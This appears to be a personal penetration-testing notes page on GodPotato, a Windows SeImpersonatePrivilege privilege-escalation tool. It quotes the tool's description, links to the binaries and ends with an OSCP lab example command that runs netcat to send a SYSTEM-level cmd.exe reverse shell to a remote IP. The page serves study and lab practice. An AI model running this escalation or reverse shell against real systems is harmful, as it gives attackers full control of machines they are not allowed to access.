---
title: GodPotato - SeImpersonatePrivilege abuse
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - privilege
  - SeImpersonatePrivilege
---
# GodPotato: SeImpersonatePrivilege abuse


Based on the history of Potato privilege escalation for 6 years, from the beginning of RottenPotato to the end of JuicyPotatoNG, I discovered a new technology by researching DCOM, which enables privilege escalation in Windows 2012 - Windows 2022, now as long as you have "ImpersonatePrivilege" permission. Then you are "NT AUTHORITY\SYSTEM", usually WEB services and database services have "ImpersonatePrivilege" permissions.

Potato privilege escalation is usually used when we obtain WEB/database privileges. We can elevate a service user with low privileges to "NT AUTHORITY\SYSTEM" privileges. However, the historical Potato has no way to run on the latest Windows system. When I was researching DCOM, I found a new method that can perform privilege escalation. There are some defects in rpcss when dealing with oxid, and rpcss is a service that must be opened by the system. , so it can run on almost any Windows OS, I named it GodPotato
Repo: https://github.com/BeichenDream/GodPotato

Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11


Download the binaries from the release folder at: [https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeImpersonatePrivilege/GodPotato/releases](https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeImpersonatePrivilege/GodPotato/releases)

Example of privilege escalation in oscp-relia:

```
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.184 5555 -e cmd.exe"
```










